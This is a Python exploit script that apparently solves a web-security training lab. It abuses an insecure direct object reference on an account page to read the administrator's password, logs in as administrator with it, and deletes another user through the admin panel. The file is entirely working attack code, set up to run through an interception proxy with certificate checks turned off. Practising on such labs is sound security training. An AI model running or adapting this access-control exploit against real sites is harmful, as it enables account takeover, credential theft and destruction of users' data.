import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(url:str, s:requests.Session):
    try:
        r = s.get(url, verify=False, proxies=proxies, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name':'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error {ex}")
        return None

def login(url:str, s:requests.Session, csrf:str, username:str, password:str):
    login_url = url + '/login'
    login_data = {'csrf': csrf, 'username': username, 'password': password}
    try:
        r = s.post(login_url, login_data, verify=False, proxies=proxies, timeout=5)
        response = r.text
        if 'Log out' in response:
            print("Logged in successfully")
            return True
        else:
            print("Failed to log in")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False
    
def get_administrator_password(url:str, s:requests.Session):
    try:
        r = s.get(url + '/my-account?id=administrator', proxies=proxies, verify=False, timeout=5)
        print("Accessed Successfully!")
        response = r.text
        soup = BeautifulSoup(response, 'html.parser')
        password = soup.find('input', {'name': 'password'})['value']
        return password
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return None

def delete_carlos(url:str, s:requests.Session):
    delete_carlos_url = url + "/admin/delete?username=carlos"
    try:
        r = s.get(delete_carlos_url, verify=False, proxies=proxies)
        if r.status_code == 200 or r.status_code == 302:
            print("Successfully deleted the Carlos user.")
            return True
        else:
            print("Could not delete the Carlos user.")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)

    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    s = requests.Session()
    csrf = get_csrf(url + '/login', s)
    if not csrf:
        print("Could not find csrf token")
        sys.exit(-1)
    
    print("Logging in as wiener")

    if not login(url, s, csrf, 'wiener', 'peter'):
        sys.exit(-1)
    
    print("Accessing Administrator account")
    administrator_password = get_administrator_password(url, s)
    if administrator_password:
        print(f"Administrator's password: {administrator_password}")
    else:
        print("Could not find admin password")
        sys.exit(-1)

    print("Logging in as admin")
    #admin csrf
    admin_csrf = get_csrf(url + '/my-account?id=administrator', s)
    login(url,s,admin_csrf,'administrator',administrator_password)
    print("Deleting Carlos")
    if delete_carlos(url, s):
        print("Lab Solved!!")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()